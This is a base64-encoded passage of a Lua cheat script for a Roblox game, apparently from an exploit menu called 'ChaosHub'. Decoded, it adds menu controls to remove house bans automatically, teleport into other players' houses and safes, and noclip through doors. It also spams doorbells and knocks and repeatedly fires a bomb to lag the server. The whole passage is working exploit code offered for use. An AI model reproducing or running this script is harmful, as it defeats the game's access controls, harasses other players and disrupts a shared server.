AgICAgIGVuZAogICAgICAgIGZvciBfLCBob3VzZSBpbiBwYWlycyhXb3Jrc3BhY2U6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgaWYgaG91c2UuTmFtZTptYXRjaCgiQmFubmVkQmxvY2siKSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBzdWNjZXNzLCBfID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGhvdXNlOkRlc3Ryb3koKQogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgaWYgc3VjY2VzcyB0aGVuCiAgICAgICAgICAgICAgICAgICAgc3VjY2Vzc0NvdW50ID0gc3VjY2Vzc0NvdW50ICsgMQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIGZhaWxDb3VudCA9IGZhaWxDb3VudCArIDEKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICBpZiBzdWNjZXNzQ291bnQgPiAwIHRoZW4KICAgICAgICAgICAgZ2FtZS5TdGFydGVyR3VpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgICAgICAgICBUaXRsZSA9ICLinIXvuLFTdWNlc3MhIiwKICAgICAgICAgICAgICAgIFRleHQgPSAiQmFuKHMpIHJlbW92ZWQgZnJvbTogIiAuLiBzdWNjZXNzQ291bnQgLi4gIiBob3VzZShzKSEiLAogICAgICAgICAgICAgICAgRHVyYXRpb24gPSA1CiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kCiAgICAgICAgaWYgZmFpbENvdW50ID4gMCB0aGVuCiAgICAgICAgICAgIGdhbWUuU3RhcnRlckd1aTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewogICAgICAgICAgICAgICAgVGl0bGUgPSAi4pqg77iP77ixV2FybmluZyEiLAogICAgICAgICAgICAgICAgVGV4dCA9ICJGYWlsZWQgdG8gcmVtb3ZlIGJhbihzKSBmcm9tOiAiIC4uIGZhaWxDb3VudCAuLiAiIGhvdXNlKHMpLiIsCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDUKICAgICAgICAgICAgfSkKICAgICAgICBlbmQKICAgICAgICBpZiBzdWNjZXNzQ291bnQgPT0gMCBhbmQgZmFpbENvdW50ID09IDAgdGhlbgogICAgICAgICAgICBnYW1lLlN0YXJ0ZXJHdWk6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKICAgICAgICAgICAgICAgIFRpdGxlID0gIuKaoO+4j++4sVdhcm5pbmchIiwKICAgICAgICAgICAgICAgIFRleHQgPSAiTm8gYmFuIGZvdW5kLiIsCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDUKICAgICAgICAgICAgfSkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKSG91c2VUYWI6QWRkUGFyYWdyYXBoKHsKICAgIFRpdGxlID0gIlNvb24/IiwKICAgIENvbnRlbnQgPSAiIgp9KQoKLS0gRHJvcGRvd24gdG8gc2VsZWN0IGhvdXNlcwpwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYjpBZGREcm9wZG93bih7CiAgICAgICAgTmFtZSA9ICJDaG9vc2UgSG91c2U6IiwKICAgICAgICBPcHRpb25zID0gZ2V0SG91c2VMaXN0KCksCiAgICAgICAgRGVmYXVsdCA9ICIuLi4iLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAgICAgIFNlbGVjdEhvdXNlID0gVmFsdWUKICAgICAgICAgICAgaWYgTm9jbGlwRG9vciB0aGVuCiAgICAgICAgICAgICAgICBOb2NsaXBEb29yOlNldChmYWxzZSkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHByaW50KCJIb3VzZSBzZWxlY3RlZDogIiAuLiB0b3N0cmluZyhWYWx1ZSkpCiAgICAgICAgZW5kCiAgICB9KQplbmQpCgotLSBGdW5jdGlvbiB0byB1cGRhdGUgdGhlIGhvdXNlIGxpc3QKbG9jYWwgZnVuY3Rpb24gRHJvcGRvd25Ib3VzZVVwZGF0ZSgpCiAgICBsb2NhbCBob3VzZVRhYmxlID0gZ2V0SG91c2VMaXN0KCkKICAgIHByaW50KCJEcm9wZG93bkhvdXNlVXBkYXRlIGNhbGxlZC4gSG91c2VzIGZvdW5kOiIsICNob3VzZVRhYmxlKQogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIEhvdXNlVGFiOkNsZWFyRHJvcGRvd24oIkNob29zZSBIb3VzZToiKSAtLSBBdHRlbXB0IHRvIGNsZWFyIGRyb3Bkb3duLCBpZiBzdXBwb3J0ZWQKICAgICAgICBIb3VzZVRhYjpBZGREcm9wZG93bih7CiAgICAgICAgICAgIE5hbWUgPSAiQ2hvb3NlIEhvdXNlOiIsCiAgICAgICAgICAgIE9wdGlvbnMgPSBob3VzZVRhYmxlLAogICAgICAgICAgICBEZWZhdWx0ID0gIi4uLiIsCiAgICAgICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAgICAgICAgICBTZWxlY3RIb3VzZSA9IFZhbHVlCiAgICAgICAgICAgICAgICBpZiBOb2NsaXBEb29yIHRoZW4KICAgICAgICAgICAgICAgICAgICBOb2NsaXBEb29yOlNldChmYWxzZSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICB9KQogICAgZW5kKQplbmQKCi0tIEluaXRpYWxpemUgZHJvcGRvd24KcGNhbGwoRHJvcGRvd25Ib3VzZVVwZGF0ZSkKCi0tIEJ1dHRvbiB0byByZWZyZXNoIGhvdXNlIGxpc3QKcGNhbGwoZnVuY3Rpb24oKQogICAgSG91c2VUYWI6QWRkQnV0dG9uKHsKICAgICAgICBOYW1lID0gIlJlc2V0IGhvdXNlIExpc3QiLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgICAgICBwcmludCgiUmVzZXQgaG91c2UgTGlzdCBidXR0b24gY2xpY2tlZC4iKQogICAgICAgICAgICBwY2FsbChEcm9wZG93bkhvdXNlVXBkYXRlKQogICAgICAgIGVuZAogICAgfSkKZW5kKQoKLS0gQnV0dG9uIHRvIHRlbGVwb3J0IHRvIGhvdXNlCnBjYWxsKGZ1bmN0aW9uKCkKICAgIEhvdXNlVGFiOkFkZEJ1dHRvbih7CiAgICAgICAgTmFtZSA9ICJUZWxlcG9ydCB0byBIb3VzZSIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIEhvdXNlID0gd29ya3NwYWNlWyIwMDFfTG90cyJdOkZpbmRGaXJzdENoaWxkKHRvc3RyaW5nKFNlbGVjdEhvdXNlKSkKICAgICAgICAgICAgaWYgSG91c2UgYW5kIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoSG91c2UuV29ybGRQaXZvdC5Qb3NpdGlvbikKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgcHJpbnQoIkhvdXNlIG5vdCBmb3VuZDogIiAuLiB0b3N0cmluZyhTZWxlY3RIb3VzZSkpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfSkKZW5kKQoKLS0gQnV0dG9uIHRvIHRlbGVwb3J0IHRvIHNhZmUKcGNhbGwoZnVuY3Rpb24oKQogICAgSG91c2VUYWI6QWRkQnV0dG9uKHsKICAgICAgICBOYW1lID0gIlRlbGVwb3J0IHRvIFNhZmUiLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCBIb3VzZSA9IHdvcmtzcGFjZVsiMDAxX0xvdHMiXTpGaW5kRmlyc3RDaGlsZCh0b3N0cmluZyhTZWxlY3RIb3VzZSkpCiAgICAgICAgICAgIGlmIEhvdXNlIGFuZCBIb3VzZTpGaW5kRmlyc3RDaGlsZCgiSG91c2VQaWNrZWRCeVBsYXllciIpIGFuZCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHNhZmUgPSBIb3VzZS5Ib3VzZVBpY2tlZEJ5UGxheWVyLkhvdXNlTW9kZWw6RmluZEZpcnN0Q2hpbGQoIjAwMV9TYWZlIikKICAgICAgICAgICAgICAgIGlmIHNhZmUgdGhlbgogICAgICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KHNhZmUuV29ybGRQaXZvdC5Qb3NpdGlvbikKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBwcmludCgiU2FmZSBub3QgZm91bmQgaW4gaG91c2U6ICIgLi4gdG9zdHJpbmcoU2VsZWN0SG91c2UpKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHByaW50KCJIb3VzZSBub3QgZm91bmQ6ICIgLi4gdG9zdHJpbmcoU2VsZWN0SG91c2UpKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0pCmVuZCkKCi0tIFRvZ2dsZSB0byBub2NsaXAgdGhyb3VnaCBkb29yCnBjYWxsKGZ1bmN0aW9uKCkKICAgIE5vY2xpcERvb3IgPSBIb3VzZVRhYjpBZGRUb2dnbGUoewogICAgICAgIE5hbWUgPSAiTm9jbGlwIEhvdXNlJ3MgRG9vcnMiLAogICAgICAgIERlc2NyaXB0aW9uID0gIiIsCiAgICAgICAgRGVmYXVsdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGxvY2FsIEhvdXNlID0gd29ya3NwYWNlWyIwMDFfTG90cyJdOkZpbmRGaXJzdENoaWxkKHRvc3RyaW5nKFNlbGVjdEhvdXNlKSkKICAgICAgICAgICAgICAgIGlmIEhvdXNlIGFuZCBIb3VzZTpGaW5kRmlyc3RDaGlsZCgiSG91c2VQaWNrZWRCeVBsYXllciIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBob3VzZXBpY2tlZGJ5cGxheWVyID0gSG91c2UuSG91c2VQaWNrZWRCeVBsYXllcgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGRvb3JzID0gaG91c2VwaWNrZWRieXBsYXllci5Ib3VzZU1vZGVsOkZpbmRGaXJzdENoaWxkKCIwMDFfSG91c2VEb29ycyIpCiAgICAgICAgICAgICAgICAgICAgaWYgZG9vcnMgYW5kIGRvb3JzOkZpbmRGaXJzdENoaWxkKCJIb3VzZURvb3JGcm9udCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIEJhc2UgaW4gaXBhaXJzKGRvb3JzLkhvdXNlRG9vckZyb250OkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBCYXNlOklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQmFzZS5DYW5Db2xsaWRlID0gbm90IFZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgfSkKZW5kKQoKLS0gVG9nZ2xlIHRvIHJpbmcgZG9vcmJlbGwKcGNhbGwoZnVuY3Rpb24oKQogICAgSG91c2VUYWI6QWRkVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIlRvZ2dsZSBSaW5nIERvb3JiZWxsIiwKICAgICAgICBEZXNjcmlwdGlvbiA9ICIiLAogICAgICAgIERlZmF1bHQgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgICAgICBnZXRnZW52KCkuQ2hhb3NIdWJBdXRvU3Bhd25Eb29yYmVsbFZhbHVlID0gVmFsdWUKICAgICAgICAgICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgZ2V0Z2VudigpLkNoYW9zSHViQXV0b1NwYXduRG9vcmJlbGxWYWx1ZSBkbwogICAgICAgICAgICAgICAgICAgIGxvY2FsIEhvdXNlID0gd29ya3NwYWNlWyIwMDFfTG90cyJdOkZpbmRGaXJzdENoaWxkKHRvc3RyaW5nKFNlbGVjdEhvdXNlKSkKICAgICAgICAgICAgICAgICAgICBpZiBIb3VzZSBhbmQgSG91c2U6RmluZEZpcnN0Q2hpbGQoIkhvdXNlUGlja2VkQnlQbGF5ZXIiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGRvb3JiZWxsID0gSG91c2UuSG91c2VQaWNrZWRCeVBsYXllci5Ib3VzZU1vZGVsOkZpbmRGaXJzdENoaWxkKCIwMDFfRG9vckJlbGwiKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBkb29yYmVsbCBhbmQgZG9vcmJlbGw6RmluZEZpcnN0Q2hpbGQoIlRvdWNoQmVsbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJlY2xpY2tkZXRlY3Rvcihkb29yYmVsbC5Ub3VjaEJlbGwuQ2xpY2tEZXRlY3RvcikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICB9KQplbmQpCgotLSBUb2dnbGUgdG8ga25vY2sgb24gZG9vcgpwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYjpBZGRUb2dnbGUoewogICAgICAgIE5hbWUgPSAiVG9nZ2xlIEtub2NrIG9uIERvb3JzIiwKICAgICAgICBEZXNjcmlwdGlvbiA9ICIiLAogICAgICAgIERlZmF1bHQgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgICAgICBnZXRnZW52KCkuQ2hhb3NIdWJBdXRvU3Bhd25Eb29yVmFsdWUgPSBWYWx1ZQogICAgICAgICAgICBzcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBnZXRnZW52KCkuQ2hhb3NIdWJBdXRvU3Bhd25Eb29yVmFsdWUgZG8KICAgICAgICAgICAgICAgICAgICBsb2NhbCBIb3VzZSA9IHdvcmtzcGFjZVsiMDAxX0xvdHMiXTpGaW5kRmlyc3RDaGlsZCh0b3N0cmluZyhTZWxlY3RIb3VzZSkpCiAgICAgICAgICAgICAgICAgICAgaWYgSG91c2UgYW5kIEhvdXNlOkZpbmRGaXJzdENoaWxkKCJIb3VzZVBpY2tlZEJ5UGxheWVyIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBkb29ycyA9IEhvdXNlLkhvdXNlUGlja2VkQnlQbGF5ZXIuSG91c2VNb2RlbDpGaW5kRmlyc3RDaGlsZCgiMDAxX0hvdXNlRG9vcnMiKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBkb29ycyBhbmQgZG9vcnM6RmluZEZpcnN0Q2hpbGQoIkhvdXNlRG9vckZyb250IikgYW5kIGRvb3JzLkhvdXNlRG9vckZyb250OkZpbmRGaXJzdENoaWxkKCJLbm9jayIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJlY2xpY2tkZXRlY3Rvcihkb29ycy5Ib3VzZURvb3JGcm9udC5Lbm9jay5Ub3VjaEJlbGwuQ2xpY2tEZXRlY3RvcikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICB9KQplbmQpCnBjYWxsKGZ1bmN0aW9uKCkKICAgIEhvdXNlVGFiOkFkZFNlY3Rpb24oeyBOYW1lID0gIlRlbGVwb3J0IHRvIEhvdXNlcyIgfSkKZW5kKQoKLS0gTGlzdCBvZiBob3VzZXMgZm9yIHRlbGVwb3J0YXRpb24KbG9jYWwgY2FzYXMgPSB7CiAgICBbIkhvdXNlIDEiXSA9IFZlY3RvcjMubmV3KDI2MC4yOSwgNC4zNywgMjA5LjMyKSwKICAgIFsiSG91c2UgMiJdID0gVmVjdG9yMy5uZXcoMjM0LjQ5LCA0LjM3LCAyMjguMDApLAogICAgWyJIb3VzZSAzIl0gPSBWZWN0b3IzLm5ldygyNjIuNzksIDIxLjM3LCAyMTAuODQpLAogICAgWyJIb3VzZSA0Il0gPSBWZWN0b3IzLm5ldygyMjkuNjAsIDIxLjM3LCAyMjUuNDApLAogICAgWyJIb3VzZSA1Il0gPSBWZWN0b3IzLm5ldygxNzMuNDQsIDIxLjM3LCAyMjguMTEpLAogICAgWyJIb3VzZSA2Il0gPSBWZWN0b3IzLm5ldygtNDMsIDIxLCAtMTM3KSwKICAgIFsiSG91c2UgNyJdID0gVmVjdG9yMy5uZXcoLTQwLCAzNiwgLTEzNyksCiAgICBbIkhvdXNlIDExIl0gPSBWZWN0b3IzLm5ldygtMjEsIDQwLCA0MzYpLAogICAgWyJIb3VzZSAxMiJdID0gVmVjdG9yMy5uZXcoMTU1LCAzNywgNDMzKSwKICAgIFsiSG91c2UgMTMiXSA9IFZlY3RvcjMubmV3KDI1NSwgMzUsIDQzMSksCiAgICBbIkhvdXNlIDE0Il0gPSBWZWN0b3IzLm5ldygyNTQsIDM4LCAzOTQpLAogICAgWyJIb3VzZSAxNSJdID0gVmVjdG9yMy5uZXcoMTQ4LCAzOSwgMzg3KSwKICAgIFsiSG91c2UgMTYiXSA9IFZlY3RvcjMubmV3KC0xNywgNDIsIDM5NSksCiAgICBbIkhvdXNlIDE3Il0gPSBWZWN0b3IzLm5ldygtMTg5LCAzNywgLTI0NyksCiAgICBbIkhvdXNlIDE4Il0gPSBWZWN0b3IzLm5ldygtMzU0LCAzNywgLTI0NCksCiAgICBbIkhvdXNlIDE5Il0gPSBWZWN0b3IzLm5ldygtNDU2LCAzNiwgLTI0NSksCiAgICBbIkhvdXNlIDIwIl0gPSBWZWN0b3IzLm5ldygtNDUzLCAzOCwgLTI5NSksCiAgICBbIkhvdXNlIDIxIl0gPSBWZWN0b3IzLm5ldygtMzU2LCAzOCwgLTI5NCksCiAgICBbIkhvdXNlIDIyIl0gPSBWZWN0b3IzLm5ldygtMTg3LCAzNywgLTI5NSksCiAgICBbIkhvdXNlIDIzIl0gPSBWZWN0b3IzLm5ldygtNDEwLCA2OCwgLTQ0NyksCiAgICBbIkhvdXNlIDI0Il0gPSBWZWN0b3IzLm5ldygtMzQ4LCA2OSwgLTQ5NiksCiAgICBbIkhvdXNlIDI4Il0gPSBWZWN0b3IzLm5ldygtMTAzLCAxMiwgMTA4NyksCiAgICBbIkhvdXNlIDI5Il0gPSBWZWN0b3IzLm5ldygtNzMwLCA2LCA4MDgpLAogICAgWyJIb3VzZSAzMCJdID0gVmVjdG9yMy5uZXcoLTI0NSwgNywgODIyKSwKICAgIFsiSG91c2UgMzEiXSA9IFZlY3RvcjMubmV3KDYzOSwgNzYsIC0zNjEpLAogICAgWyJIb3VzZSAzMiJdID0gVmVjdG9yMy5uZXcoLTkwOCwgNiwgLTM2MSksCiAgICBbIkhvdXNlIDMzIl0gPSBWZWN0b3IzLm5ldygtMTExLCA3MCwgLTQxNyksCiAgICBbIkhvdXNlIDM0Il0gPSBWZWN0b3IzLm5ldygyMzAsIDM4LCA1NjkpLAogICAgWyJIb3VzZSAzNSJdID0gVmVjdG9yMy5uZXcoLTMwLCAxMywgMjIwOSkKfQoKLS0gQ3JlYXRlIHNvcnRlZCBsaXN0IG9mIGhvdXNlIG5hbWVzCmxvY2FsIGhvdXNlTmFtZXMgPSB7fQpmb3IgbmFtZSwgXyBpbiBwYWlycyhjYXNhcykgZG8KICAgIHRhYmxlLmluc2VydChob3VzZU5hbWVzLCBuYW1lKQplbmQKCnRhYmxlLnNvcnQoaG91c2VOYW1lcywgZnVuY3Rpb24oYSwgYikKICAgIGxvY2FsIG51bUEgPSB0b251bWJlcihhOm1hdGNoKCIlZCsiKSkgb3IgMAogICAgbG9jYWwgbnVtQiA9IHRvbnVtYmVyKGI6bWF0Y2goIiVkKyIpKSBvciAwCiAgICByZXR1cm4gbnVtQSA8IG51bUIKZW5kKQoKLS0gRHJvcGRvd24gZm9yIHRlbGVwb3J0YXRpb24KcGNhbGwoZnVuY3Rpb24oKQogICAgSG91c2VUYWI6QWRkRHJvcGRvd24oewogICAgICAgIE5hbWUgPSAiQ2hvb3NlIGhvdXNlOiIsCiAgICAgICAgT3B0aW9ucyA9IGhvdXNlTmFtZXMsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzZWxlY3RlZEhvdXNlKQogICAgICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICAgICAgaWYgcGxheWVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgIHBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KGNhc2FzW3NlbGVjdGVkSG91c2VdKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0pCmVuZCkKCi0tIExhYmVsIGFmdGVyIGRyb3Bkb3duCnBjYWxsKGZ1bmN0aW9uKCkKICAgIEhvdXNlVGFiOkFkZExhYmVsKCJUZWxlcG9ydCB0byBhbnkgaG91c2UgeW91IHdhbnQuIikKZW5kKQoKLS0gU2VjdGlvbiBmb3IgQXV0byBVbmJhbgpwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYjpBZGRTZWN0aW9uKHsgTmFtZSA9ICLwn5qr77ixQXV0byBVbmJhbiIgfSkKZW5kKQoKLS0gVG9nZ2xlIGZvciBBdXRvIFVuYmFuCnBjYWxsKGZ1bmN0aW9uKCkKICAgIEhvdXNlVGFiOkFkZFRvZ2dsZSh7CiAgICAgICAgTmFtZSA9ICJBdXRvIFVuYmFuIiwKICAgICAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgaXNVbmJhbkFjdGl2ZSA9IHN0YXRlCiAgICAgICAgICAgIGlmIGlzVW5iYW5BY3RpdmUgdGhlbgogICAgICAgICAgICAgICAgcHJpbnQoIkF1dG8gVW5iYW4gQWN0aXZhdGVkLiIpCiAgICAgICAgICAgICAgICBzcGF3bihzdGFydEF1dG9VbmJhbikKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgcHJpbnQoIkF1dG8gVW5iYW4gRGVhY3RpdmF0ZWQuIikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9KQplbmQpCgotLSBMYWJlbCBhZnRlciBBdXRvIFVuYmFuCnBjYWxsKGZ1bmN0aW9uKCkKICAgIEhvdXNlVGFiOkFkZExhYmVsKCLimqDvuI/vuLFBdXRvbWF0aWNhbGx5IHVuYmFucyB5b3UgZnJvbSBob3VzZXMuIikKZW5kKQoKLS0gU2VjdGlvbiBmb3IgSG91c2UgUkdCCnBjYWxsKGZ1bmN0aW9uKCkKICAgIEhvdXNlVGFiOkFkZFNlY3Rpb24oeyBOYW1lID0gIvCfj6HvuLFSYWluYm93IEhvdXNlIiB9KQplbmQpCgotLSBUb2dnbGUgZm9yIEhvdXNlIFJHQgpwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYjpBZGRUb2dnbGUoewogICAgICAgIE5hbWUgPSAiUmFpbmJvdyBIb3VzZSIsCiAgICAgICAgRGVmYXVsdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgIHRvZ2dsZUhvdXNlUkdCKHN0YXRlKQogICAgICAgIGVuZAogICAgfSkKZW5kKQoKLS0gTGFiZWwgYWZ0ZXIgSG91c2UgUkdCCnBjYWxsKGZ1bmN0aW9uKCkKICAgIEhvdXNlVGFiOkFkZExhYmVsKCLwn5OE77ixVHVybnMgeW91ciBob3VzZSB3aXRoIG11bHRpcGxlIGNvbG9ycy4iKQplbmQpCgotLSBGdW5jdGlvbiBmb3IgQXV0byBVbmJhbgpmdW5jdGlvbiBzdGFydEF1dG9VbmJhbigpCiAgICB3aGlsZSBpc1VuYmFuQWN0aXZlIGRvCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOldhaXRGb3JDaGlsZCgiMDAxX0xvdHMiKTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgaWYgdi5OYW1lOm1hdGNoKCJeQmFubmVkQmxvY2slZCskIikgdGhlbgogICAgICAgICAgICAgICAgICAgIHY6RGVzdHJveSgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgICAgIHRhc2sud2FpdCgxKQogICAgZW5kCmVuZAoKbG9jYWwgVGFiID0gV2luZG93Ok1ha2VUYWIoeyLvuLFTcGFtIGJvbWIiLCAicmJ4YXNzZXRpZDovLzcwNzQ1OTUzNTU1NDk4In0pCgpsb2NhbCBTZWN0aW9uID0gVGFiOkFkZFNlY3Rpb24oewogICAgTmFtZSA9ICLwn5Kj77ixTGFnIHVzaW5nIEJvbWIiCn0pCgpsb2NhbCBCb21iQWN0aXZlID0gZmFsc2UKClRhYjpBZGRQYXJhZ3JhcGgoewogICAgIuKaoO+4j++4sUluZm9ybWF0aW9uIiwKICAgICJUaGUgbGFnIGVmZmVjdCBzdGFydHMgYWZ0ZXIgMzUgc2Vjb25kcyEiCn0pCgpUYWI6QWRkVG9nZ2xlKHsKICAgIE5hbWUgPSAiTGFnIHVzaW5nIEJvbWIiLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKICAgICAgICBpZiBWYWx1ZSB0aGVuCiAgICAgICAgICAgIEJvbWJBY3RpdmUgPSB0cnVlCgogICAgICAgICAgICBsb2NhbCBQbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICAgICAgbG9jYWwgQ2hhcmFjdGVyID0gUGxheWVyLkNoYXJhY3RlciBvciBQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICAgICAgICAgIGxvY2FsIFJvb3RQYXJ0ID0gQ2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgIGxvY2FsIFdvcmtzcGFjZVNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpCiAgICAgICAgICAgIGxvY2FsIFJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpCiAgICAgICAgICAgIGxvY2FsIEJvbWIgPSBXb3Jrc3BhY2VTZXJ2aWNlOldhaXRGb3JDaGlsZCgiV29ya3NwYWNlQ29tIik6V2FpdEZvckNoaWxkKCIwMDFfQ3JpbWluYWxXZWFwb25zIik6V2FpdEZvckNoaWxkKCJHaXZlVG9vbHMiKTpXYWl0Rm9yQ2hpbGQoIkJvbWIiKQoKICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBCb21iQWN0aXZlIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgQm9tYiBhbmQgUm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBSb290UGFydC5DRnJhbWUgPSBCb21iLkNGcmFtZQogICAgICAgICAgICAgICAgICAgICAgICBmaXJlY2xpY2tkZXRlY3RvcihCb21iLkNsaWNrRGV0ZWN0b3IpIC0tIFRyaWdnZXJzIHRoZSBib21iJ3MgQ2xpY2tEZXRlY3RvcgogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wMDAwMDAwMDAwMSkgLS0gTWluaW11bSBkZWxheSB0byBhdm9pZCBjcmFzaGVzCiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wMDAwMDAwMDAwMSkgCiAgICAgICAgI